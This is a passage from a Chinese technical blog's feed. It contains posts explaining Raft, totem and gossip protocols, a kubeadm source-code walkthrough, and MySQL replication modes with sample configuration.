currentTerm，将currentTerm设置为T并转换为Follower</li></ul><p><em>Followers</em></p><ul><li>响应来自Leader和Candidate的RPC请求</li><li>如果在选举超时周期内没有收到AppendEntries的请求或者给Candidate投票，转换为Candidate角色</li></ul><p><em>Candidates</em></p><ul><li><p>转换为candidate角色，开始选举：</p></li><li><ul><li>递增currentTerm</li><li>给自己投票</li><li>重置选举时间</li><li>发送RequestVote给其他所有节点</li></ul></li><li><p>如果收到了大多数节点的选票，转换为Leader节点</p></li><li><p>如果收到Leader节点的AppendEntries请求，转换为Follower节点</p></li><li><p>如果选举超时，重新开始新一轮的选举</p></li></ul><p><em>Leaders</em></p><ul><li><p>一旦选举完成：发送心跳给所有节点；在空闲的周期内不断发送心跳保持Leader身份</p></li><li><p>如果收到客户端的请求，将日志追加到本地log，在日志被应用到状态机后响应给客户端</p></li><li><p>如果对于一个跟随者，最后日志条目的索引值大于等于 nextIndex，那么：发送从 nextIndex 开始的所有日志条目：</p></li><li><ul><li>如果成功：更新相应跟随者的 nextIndex 和 matchIndex</li><li>如果因为日志不一致而失败，减少 nextIndex 重试</li><li>如果存在一个满足N &gt; commitIndex的 N，并且大多数的matchIndex[i] ≥ N成立，并且log[N].term == currentTerm成立，那么令commitIndex等于这个N</li></ul></li></ul><h3 id="totem协议"><a href="#totem协议" class="headerlink" title="totem协议"></a>totem协议</h3><p>totem协议，最简单的形象就是，他将多个节点组成一个令牌环。多个节点手拉手形成一个圈，大家依次的传递token。只有获取到token的节点才有发送消息的权利。简单有效的解决了在分布式系统中各个节点的同步问题，因为只有一个节点会在一个时刻发送消息，不会出现冲突。当然，如果有节点发生意外时，令牌环就会断掉，此时大家不能够通信，而是重新组建出一个新的令牌环。</p><p>galera和corosync就是基于这个协议来实现。</p><h3 id="gossip协议"><a href="#gossip协议" class="headerlink" title="gossip协议"></a>gossip协议</h3><p>简单的描述下这个协议，首先要传播谣言就要有种子节点。种子节点每秒都会随机向其他节点发送自己所拥有的节点列表，以及需要传播的消息。任何新加入的节点，就在这种传播方式下很快地被全网所知道。这个协议的神奇就在于它从设计开始就没想到信息一定要传递给所有的节点，但是随着时间的增长，在最终的某一时刻，全网会得到相同的信息。当然这个时刻可能仅仅存在于理论，永远不可达。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="分布式" scheme="http://www.yorzorzy.xyz/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
    
      <category term="分布式" scheme="http://www.yorzorzy.xyz/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>kubeadm原理分析</title>
    <link href="http://www.yorzorzy.xyz/2020/06/22/kubernetes_adm%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.yorzorzy.xyz/2020/06/22/kubernetes_adm%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-06-22T05:33:15.965Z</published>
    <updated>2020-06-22T05:33:15.965Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="kubeadm原理分析"><a href="#kubeadm原理分析" class="headerlink" title="kubeadm原理分析"></a>kubeadm原理分析</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>kubeadm是Kubernetes 1.4开始新增的特性，用于快速搭建Kubernetes集群环境，两个命令就能把一个k8s集群搭建起来。之前广为诟病的“k8s环境搭建难”的问题，很快得到突破性的解决。本博文基于kubernetes v1.5.0源码对kubeadm工作原理和流程的分析，一窥其内部的工作流。</p><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><p><img src="/images/20170413223653157.jpg" alt="kubeadminit"></p><p><img src="/images/20170413223709110.jpg" alt="kubeadm"></p><h3 id="主要工作介绍"><a href="#主要工作介绍" class="headerlink" title="主要工作介绍"></a>主要工作介绍</h3><p>kubeadm init主要工作：<br>创建集群安全相关的的key、certs和conf文件。<br>创建kube-apiserver、kube-controller-manager、kube-scheduler、etcd(如果没有配置external etcd)这些static pod的json格式的manifest文件，kubelet负责启动这些master组件。<br>通过addons方式启动kube-discovery deployment、kube-proxy daemonSet、kube-dns deployment</p><p>kubeadm join主要负责创建kubelet.conf，使kubelet能与API Server建立连接：<br>访问kube-discovery服务获取cluster info（包含cluster ca证书、API Server endpoint列表和token。<br>利用定的token，检验cluster info的签名。<br>检验成功后，再与API Server建立连接，请求API Server为该node创建证书。<br>根据获取到的证书创建kubelet.conf。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>源码分析：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := app.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行run函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewKubeadmCommand returns cobra.Command to run kubeadm command</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewKubeadmCommand</span><span class="params">(in io.Reader, out, err io.Writer)</span> *<span class="title">cobra</span>.<span class="title">Command</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> rootfsPath <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">cmds := &amp;cobra.Command&#123;</span><br><span class="line">Use:   <span class="string">"kubeadm"</span>,</span><br><span class="line">Short: <span class="string">"kubeadm: easily bootstrap a secure Kubernetes cluster"</span>,</span><br><span class="line">Long: dedent.Dedent(<span class="string">`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ┌──────────────────────────────────────────────────────────┐</span></span><br><span class="line"><span class="string">    │ KUBEADM                                                  │</span></span><br><span class="line"><span class="string">    │ Easily bootstrap a secure Kubernetes cluster             │</span></span><br><span class="line"><span class="string">    │                                                          │</span></span><br><span class="line"><span class="string">    │ Please give us feedback at:                              │</span></span><br><span class="line"><span class="string">    │ https://github.com/kubernetes/kubeadm/issues             │</span></span><br><span class="line"><span class="string">    └──────────────────────────────────────────────────────────┘</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Example usage:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Create a two-machine cluster with one control-plane node</span></span><br><span class="line"><span class="string">    (which controls the cluster), and one worker node</span></span><br><span class="line"><span class="string">    (where your workloads, like Pods and Deployments run).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ┌──────────────────────────────────────────────────────────┐</span></span><br><span class="line"><span class="string">    │ On the first machine:                                    │</span></span><br><span class="line"><span class="string">    ├──────────────────────────────────────────────────────────┤</span></span><br><span class="line"><span class="string">    │ control-plane# kubeadm init                              │</span></span><br><span class="line"><span class="string">    └──────────────────────────────────────────────────────────┘</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ┌──────────────────────────────────────────────────────────┐</span></span><br><span class="line"><span class="string">    │ On the second machine:                                   │</span></span><br><span class="line"><span class="string">    ├──────────────────────────────────────────────────────────┤</span></span><br><span class="line"><span class="string">    │ worker# kubeadm join &lt;arguments-returned-from-init&gt;      │</span></span><br><span class="line"><span class="string">    └──────────────────────────────────────────────────────────┘</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    You can then repeat the second step on as many other machines as you like.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span>),</span><br><span class="line"></span><br><span class="line">PersistentPreRunE: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> rootfsPath != <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := kubeadmutil.Chroot(rootfsPath); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cmds.ResetFlags()</span><br><span class="line"></span><br><span class="line">cmds.AddCommand(NewCmdCompletion(out, <span class="string">""</span>))</span><br><span class="line">cmds.AddCommand(NewCmdConfig(out))</span><br><span class="line">cmds.AddCommand(NewCmdInit(out, <span class="literal">nil</span>))</span><br><span class="line">cmds.AddCommand(NewCmdJoin(out, <span class="literal">nil</span>))</span><br><span class="line">cmds.AddCommand(NewCmdReset(in, out, <span class="literal">nil</span>))</span><br><span class="line">cmds.AddCommand(NewCmdVersion(out))</span><br><span class="line">cmds.AddCommand(NewCmdToken(out, err))</span><br><span class="line">cmds.AddCommand(upgrade.NewCmdUpgrade(out))</span><br><span class="line">cmds.AddCommand(alpha.NewCmdAlpha(in, out))</span><br><span class="line"></span><br><span class="line">options.AddKubeadmOtherFlags(cmds.PersistentFlags(), &amp;rootfsPath)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cmds</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dry-run表示测试，不真正执行命令</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="k8s" scheme="http://www.yorzorzy.xyz/categories/k8s/"/>
    
    
      <category term="k8s" scheme="http://www.yorzorzy.xyz/tags/k8s/"/>
    
  </entry>
  
  <entry>
    <title>mysql主从复制原理</title>
    <link href="http://www.yorzorzy.xyz/2020/06/19/mysql%E5%8F%8C%E4%B8%BB%E5%A4%8D%E5%88%B6%E5%8E%9F%E7%90%86/"/>
    <id>http://www.yorzorzy.xyz/2020/06/19/mysql%E5%8F%8C%E4%B8%BB%E5%A4%8D%E5%88%B6%E5%8E%9F%E7%90%86/</id>
    <published>2020-06-19T06:00:28.488Z</published>
    <updated>2020-06-19T06:00:28.488Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mysql主从复制原理"><a href="#mysql主从复制原理" class="headerlink" title="mysql主从复制原理"></a>mysql主从复制原理</h2><p>[toc]</p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>在2000年，MySQL 3.23.15版本引入了Replication。Replication作为一种准实时同步方式，得到广泛应用。</p><p>这个时候的Replicaton的实现涉及到两个线程，一个在Master，一个在Slave。Slave的I/O和SQL功能是作为一个线程，从Master获取到event后直接apply，没有relay log。这种方式使得读取event的速度会被Slave replay速度拖慢，当主备存在较大延迟时候，会导致大量binary log没有备份到Slave端。</p><p>在2002年，MySQL 4.0.2版本将Slave端event读取和执行独立成两个线程（IO线程和SQL线程），同时引入了relay log。IO线程读取event后写入relay log，SQL线程从relay log中读取event然后执行。这样即使SQL线程执行慢，Master的binary log也会尽可能的同步到Slave。当Master宕机，切换到Slave，不会出现大量数据丢失。</p><p>MySQL在2010年5.5版本之前，一直采用的是异步复制。主库的事务执行不会管备库的同步进度，如果备库落后，主库不幸crash，那么就会导致数据丢失。</p><p>MySQL在5.5中引入了半同步复制，主库在应答客户端提交的事务前需要保证至少一个从库接收并写到relay log中。那么半同步复制是否可以做到不丢失数据呢。</p><p>在2016年，MySQL在5.7.17中引入了Group Replication。</p><h3 id="几种复制协议差别"><a href="#几种复制协议差别" class="headerlink" title="几种复制协议差别"></a>几种复制协议差别</h3><p><img src="http://www.ywnds.com/wp-content/uploads/2016/04/2017012217093677-689x500.gif" alt="MySQL 5.7半同步复制技术"></p><p>对于异步复制，主库将事务Binlog事件写入到Binlog文件中，此时主库只会通知一下Dump线程发送这些新的Binlog，然后主库就会继续处理提交操作，而此时不会保证这些Binlog传到任何一个从库节点上。</p><p>对于全同步复制，当主库提交事务之后，所有的从库节点必须收到，APPLY并且提交这些事务，然后主库线程才能继续做后续操作。这里面有一个很明显的缺点就是，主库完成一个事务的时间被拉长，性能降低。</p><p>对于半同步复制，是介于全同步复制和异步复制之间的一种，主库只需要等待至少一个从库节点收到并且Flush Binlog到Relay Log文件即可，主库不需要等待所有从库给主库反馈。同时，这里只是一个收到的反馈，而不是已经完全执行并且提交的反馈，这样就节省了很多时间。</p><h3 id="异步复制"><a href="#异步复制" class="headerlink" title="异步复制"></a>异步复制</h3><p>异步复制也就是说的mysql的主从复制，叫replication。</p><p>复制存在的问题：</p><ol><li>宕机情况下，可能存在数据丢失情况</li><li>从库只有一个sql线程，主库写压力大时候，复制延迟</li></ol><p>基本原理介绍：</p><ol><li>mysql主从复制是一个异步复制的过程。从一个实例（master）复制到另一个实例（slave），整个过程要由master上的I/O进程和slave上的sql进程和I/O进程共同完成。</li><li>首先master必须打开binary log(bin-log),因为整个复制过程实际上就是slave端从master端获取相应的二进制日志，然后在本地完全顺序的执行日志中纪录的各种操作。</li></ol><p>主从复制过程：</p><ol><li>Slave 端的 IO 进程连接上 Master，向 Master 请求指定日志文件的指定位置（或者从最开始的日志）之后的日志内容；</li><li>Master 接收到来自 Slave 的 IO 进程的请求后，负责复制的 IO 进程根据 Slave 的请求信息，读取相应日志内容，返回给 Slave 的IO进程，并将本次请求读取的 bin-log 文件名及位置一起返回给 Slave 端</li><li>Slave 端的 IO 进程接收到信息后，将接收到的日志内容依次添加到 Slave 端的 relay-log(中继日志) 文件的最末端，并将读取到的 Master 端的 bin-log 的文件名和位置记录到 master-info 文件中，以便在下一次读取的时候能够清楚的告诉 Master ：”我需要从某个 bin-log 的哪个位置开始往后的日志内容，请发给我”；</li><li>Slave 端的 Sql 进程检测到 relay-log (中继日志)中新增加了内容后，会马上解析 relay-log 的内容成为在 Master 端真实执行时候的那些可执行的内容，并在本地执行。</li></ol><p>复制拓扑：</p><p><img src="/images/image-20200601104405564.png" alt="image-20200601104405564"></p><p>参数说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">skip-name-resolve# 跳过域名</span><br><span class="line">slave_parallel_workers &#x3D; &#96;&#96;8 # 并行复制工作线程</span><br><span class="line">slave_parallel_type&#x3D; logical_clock# 并行复制组提交并行复制</span><br><span class="line">max_connections &#x3D; &#96;&#96;8192# 最大连接数</span><br><span class="line">server-id&#x3D;&#96;&#96;2# 服务id</span><br><span class="line">auto_increment_offset&#x3D;&#96;&#96;2# 自增偏移，两节点设置偶数和奇数</span><br><span class="line">auto_increment_increment&#x3D;&#96;&#96;2# 自增</span><br><span class="line">log-bin &#x3D; mysql-bin# 日志</span><br><span class="line">max_binlog_size&#x3D;1024M# 最大binlog日志大小</span><br><span class="line">replicate-ignore-db &#x3D; mysql#忽略同步数据库</span><br><span class="line">replicate-ignore-db &#x3D; information_schema</span><br><span class="line">replicate-ignore-db &#x3D; performance_schema</span><br><span class="line">replicate-ignore-db &#x3D; test</span><br><span class="line">bind-address&#x3D;&#96;&#96;10.130&#96;&#96;.&#96;&#96;232.91# 地址</span><br><span class="line">max_allowed_packet &#x3D; 500M#最大数据包</span><br><span class="line">interactive_timeout &#x3D; &#96;&#96;120#交互超时</span><br><span class="line">wait_timeout &#x3D; &#96;&#96;120# 连接wait超时</span><br><span class="line">log_warnings&#x3D;&#96;&#96;1# 日志warnings</span><br><span class="line">net_read_timeout&#x3D;&#96;&#96;600# 数据读取超时时间</span><br><span class="line">net_write_timeout&#x3D;&#96;&#96;600# 数据写入超时时间</span><br><span class="line">character-set-server &#x3D; utf8# 编码</span><br><span class="line">validate_password_policy&#x3D;LOW# 密码铭感</span><br><span class="line">slave-skip-errors&#x3D;all# slave跳过所有错误</span><br></pre></td></tr></table></figure><h3 id="半同步复制"><a href="#半同步复制" class="headerlink" title="半同步复制"></a>半同步复制</h3><p>半同步复制原理图：</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/4153fcafc3c14bfa7ff94770d41b49a5.png" alt="after_commit.png"></p><p>master将每个事务写入binlog（sync_binlog=1），传递到slave刷新到磁盘(sync_relay=1)，同时主库提交事务（commit）。master等待slave反馈收到relay log，只有收到ACK后master才将commit OK结果反馈给客户端。</p><p>半同步具体特性：</p><ol><li>从库会在连接到主库时告诉主库，它是不是配置了半同步。</li><li>如果半同步复制在主库端是开启了的，并且至少有一个半同步复制的从库节点，那么此时主库的事务线程在提交时会被阻塞并等待，结果有两种可能，要么至少一个从库节点通知它已经收到了所有这个事务的Binlog事件，要么一直等待直到超过配置的某一个时间点为止，而此时，半同步复制将自动关闭，转换为异步复制。</li><li>从库节点只有在接收到某一个事务的所有Binlog，将其写入并Flush到Relay Log文件之后，才会通知对应主库上面的等待线程。</li><li>如果在等待过程中，等待时间已经超过了配置的超时时间，没有任何一个从节点通知当前事务，那么此时主库会自动转换为异步复制，当至少一个半同步从节点赶上来时，主库便会自动转换为半同步方式的复制。</li><li>半同步复制必须是在主库和从库两端都开启时才行，如果在主库上没打开，或者在主库上开启了而在从库上没有开启，主库都会使用异步方式复制。</li></ol><p>一致性问题分析：</p><p>半同步方式，主库在等待备库ack时候，如果超时会退化为异步，这就可能导致数据丢失。在接下来分析中，先假设rpl_semi_sync_master_timeout足够大，不会退化为异步方式。</p><p>1)rpl_semi_sync_master_wait_point配置</p><p>参考资料源码分析得：</p><p>rpl_semi_sync_master_wait_point分为：WAIT_AFTER_COMMIT和WAIT_AFTER_SYNC</p><p>配置after_commit：</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/4153fcafc3c14bfa7ff94770d41b49a5.png" alt="after_commit.png"></p><p>即在等待Slave ACK时候，虽然没有返回当前客户端，但事务已经提交，其他客户端会读取到已提交事务。如果Slave端还没有读到该事务的events，同时主库发生了crash，然后切换到备库。那么之前读到的事务就不见了，出现了幻读。</p><p>配置after_sync:</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/08b666b3acb193dc1a0aa5ca506a345c.png" alt="after_sync.png"></p><p>在调用binlog sync之后，engine层commit之前等待Slave ACK。这样只有在确认Slave收到事务events后，事务才会提交。在commit之前等待Slave ACK，同时可以堆积事务，利于group commit，有利于提升性能。</p><p>2）after_sync和after_commit配置分析：</p><p>WAIT_AFTER_SYNC和WAIT_AFTER_COMMIT两图中Send Events的位置，也可能导致主备数据不一致，出现同步失败的情形。实际在rpl_semi_sync_master_wait_point分析的图中是sync binlog大于1的情况。根据上面源码，流程如下图所示。Master依次执行flush binlog， update binlog position， sync binlog。如果Master在update binlog position后，sync binlog前掉电，Master再次启动后原事务就会被回滚。但可能出现Slave获取到Events，这也会导致Slave数据比Master多，主备同步失败。</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/dcd2d2a0c5b1e5cdaee20ed22f2ba8b9.png" alt="sync_after_update.png"></p><p>由于上面的原因，sync_binlog设置为1的时候，MySQL会update binlog end pos after sync。流程如下图所示。这时候，对于每一个事务都需要sync binlog，同时sync binlog和网络发送events会是一个串行的过程，性能下降明显。</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/f27a51f68bd1922bccc2009381107a9d.png" alt="update_after_sync.png"></p><p>3）sync_relay_log配置</p><p>在Slave的IO线程中get_sync_period获得的是sync_relay_log的值，与sync_binlog对sync控制一样。当sync_relay_log不是1的时候，semisync返回给Master的position可能没有sync到磁盘。在gtid_mode下，在保证前面两个配置正确的情况下，sync_relay_log不是1的时候，仅发生Master或Slave的一次Crash并不会发生数据丢失或者主备同步失败情况。如果发生Slave没有sync relay log，Master端事务提交，客户端观察到事务提交，然后Slave端Crash。这样Slave端就会丢失掉已经回复Master ACK的事务events。</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/62a885ef35f03a205b7a38ddbcb83a96.png" alt="slave_crash.png"></p><h3 id="并行优化"><a href="#并行优化" class="headerlink" title="并行优化"></a>并行优化</h3><p>MySQL5.6提出并行复制，官方称为为enhanced multi-threaded slave（简称MTS）</p><p>MySQL的主备同步是通过binlog在备库重放进行的，IO线程把主库binlog拉过去存入relaylog，然后SQL线程重放 relaylog 中的event，然而这种模式有一个问题就是SQL线程只有一个，在主库压力大的时候，备库单个SQL线程是跑不过主库的多个用户线程的，这样备库延迟是不可避免的。为了解决这种n对1造成的备库延迟问题，5.6 引入了并行复制机制，即SQL线程在执行的时候可以并发跑。</p><p><img src="/images/image-20200601112945808.png" alt="image-20200601112945808"></p><p>在MySQL 5.6版本之前，Slave服务器上有两个线程I/O线程和SQL线程。I/O线程负责接收二进制日志（更准确的说是二进制日志的event），SQL线程进行回放二进制日志。如果在MySQL 5.6版本开启并行复制功能，那么SQL线程就变为了coordinator线程，coordinator线程主要负责以前两部分的内容：</p><ol><li>若判断可以并行执行，那么选择worker线程执行事务的二进制日志</li><li>若判断不可以并行执行，如该操作是DDL，亦或者是事务跨schema操作，则等待所有的worker线程执行完成之后，再执行当前的日志</li></ol><p>coordinator线程并不是仅将日志发送给worker线程，自己也可以回放日志，但是所有可以并行的操作交付由worker线程完成。coordinator线程与worker是典型的生产者与消费者模型。</p><p>MySQL 5.7基于组提交的并行复制：</p><p>MySQL 5.7才可称为真正的并行复制，这其中最为主要的原因就是slave服务器的回放与主机是一致的即master服务器上是怎么并行执行的slave上就怎样进行并行回放。不再有库的并行复制限制，对于二进制日志格式也无特殊的要求（基于库的并行复制也没有要求）。</p><p>MySQL 5.7并行复制的思想简单易懂，一言以蔽之： <strong>一个组提交的事务都是可以并行回放</strong> ，因为这些事务都已进入到事务的prepare阶段，则说明事务之间没有任何冲突（否则就不可能提交）。</p><p>为了兼容MySQL 5.6基于库的并行复制，5.7引入了新的变量slave-parallel-type，其可以配置的值有：</p><ul><li>DATABASE：默认值，基于库的并行复制方式</li><li>LOGICAL_CLOCK：基于组提交的并行复制方式</li></ul><p>并行复制配置调优：</p><p>master_info_repository： 开启MTS功能后，务必将参数master_info_repostitory设置为TABLE，这样性能可以有50%~80%的提升。</p><p>开启enhanced multi-threaded slave：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">slave-parallel-type&#x3D;LOGICAL_CLOCK</span><br><span class="line">slave-parallel-workers&#x3D;16</span><br><span class="line">master_info_repository&#x3D;TABLE</span><br><span class="line">relay_log_info_repository&#x3D;TABLE</span><br><span class="line">relay_log_recovery&#x3D;ON</span><br></pre></td></tr></table></figure><p>虽然mysql5.7添加MTS后，虽然slave可以并行应用relay log，但commit部分仍然是顺序提交，其中可能会有等待的情况。当开启slave_preserve_commit_order参数后，slave_parallel_type只能是LOGICAL_CLOCK，如果你有使用级联复制，那`LOGICAL_CLOCK可能会使离master越远的slave并行性越差。</p><h3 id="group-replication"><a href="#group-replication" class="headerlink" title="group replication"></a>group replication</h3><p>MySQL Group Replication（简称MGR）是MySQL官方于2016年12月推出的一个全新的高可用与高扩展的解决方案。MySQL组复制提供了高可用、高扩展、高可靠的MySQL集群服务。</p><p>高一致性，基于原生复制及paxos协议的组复制技术，并以插件的方式提供，提供一致数据安全保证；</p><p><img src="/images/1311801-20180906105509772-1977689111.png" alt="img"></p><p>需要选主来保证集群一致性，相比galera，没有galera一致性强。</p><h3 id="双主复制"><a href="#双主复制" class="headerlink" title="双主复制"></a>双主复制</h3><p>双主的方式和互为主从的实现原理一致，不过是互为主从。</p><p><img src="/images/wKioL1gh5TqwapxCAAB3AioNZqw030.jpg" alt="Image"></p><p>双主架构思路：</p><p>1.两台mysql都可读写，互为主备，默认只使用一台（masterA）负责数据的写入，另一台（masterB）备用；</p><p>2.masterA是masterB的主库，masterB又是masterA的主库，它们互为主从；</p><p>3.所有提供服务的从服务器与masterB进行主从同步（双主多从）;</p><p>4.建议采用高可用策略的时候，masterA或masterB均不因宕机恢复后而抢占VIP（非抢占模式）；</p><p>这样做可以在一定程度上保证主库的高可用,在一台主库down掉之后,可以在极短的时间内切换到另一台主库上（尽可能减少主库宕机对业务造成的影响），减少了主从同步给线上主库带来的压力；</p><p>不足：</p><ol><li>masterB可能会一直处于空闲状态</li><li>主库后面提供服务的从库要等masterB先同步完了数据后才能去masterB上去同步数据，这样可能会造成一定程度的同步延时；</li><li>脏数据问题</li></ol><p>并发优化：mysql基于5.7.21版本，在这个基础上增加了组并发回放的机制，能够更加快的同步数据。相比于异步复制的方式好一些。</p><p>同步一致性问题：</p><p>1）<strong>相同步长免冲突</strong></p><p>2）<strong>上游生成ID避冲突</strong></p><p>3）定期进行主从一致性检验</p><p>遇到的问题：</p><p>1）多节点写入问题：mysql互为主从的环境，更新一条语句同时提交，update一条记录同时提交，有主键的情况下，sql_thread是根据主键匹配行记录，不会校验行数据，所以m1更新了m2中表的记录，m2更新了m1中表的记录。update一条记录同时提交，有没有主键的情况下，sql_thread是根据全表扫描匹配行记录，所以m1更新在m2中找不到需要更新的行，报1032错误，m2更新在m1中找不到需要更新的行，也报1032错误。</p><p>2）1062错误， 主键冲突，出现这种情况就是从库出现插入操作，主库又重新来了一遍，iothread没问题，sqlthread出错</p><p>3）1032错误，现在生产库中好多数据，在从库误删了，生产库更新后找不到了，现在主从不同步了，再跳过错误也没用，因为没这条，再更新还会报错，</p><p>4）遇到最多的就是从库数据被修改之后，无法保证一致了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>mysql不同复制协议在一致性方面所有差异，但是总体看来在某些场景下，存在不一致的问题。需要针对具体情况去解决分析和优化方案。</p><p>半同步复制虽然增加了ack确认的机制，但是在一些场景下依然存在数据一致性的问题。</p><p>双主方案可以在一些对数据一致性不高的环境中使用，存在数据不一致的情况，需要针对不同的情况进行处理。相比galera多主和group replication的方案较差。</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>数据库月报：<a href="http://mysql.taobao.org/monthly/2017/04/01/" target="_blank" rel="noopener">http://mysql.taobao.org/monthly/2017/04/01/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;mysql主从复制原理&quot;&gt;&lt;a href=&quot;#mysql主从复制原理&quot; class=&quot;headerlink&quot; title=&quot;mysql主从复制原理&quot;&gt;&lt;/a&gt;mysql主从复制原理&lt;/h2&gt;&lt;p&gt;[toc]&lt;/p&gt;
&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍
      
    
    </summary>
    
    
      <category term="mysql" scheme="http://www.yorzorzy.xyz/categories/mysql/"/>
    
    
      <category term="mysql" scheme="http://www.yorzorzy.xyz/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>go协程调度机制</title>
    <link href="http://www.yorzorzy.xyz/2020/06/19/go%E5%8D%8F%E7%A8%8B%E8%B0%83%E5%BA%A6%E6%9C%BA%E5%88%B6/"/>
    <id>http://www.yorzorzy.xyz/2020/06/19/go%E5%8D%8F%E7%A8%8B%E8%B0%83%E5%BA%A6%E6%9C%BA%E5%88%B6/</id>
    <published>2020-06-19T05:22:35.694Z</published>
    <updated>2020-06-19T05:22:35.694Z</updated>
    
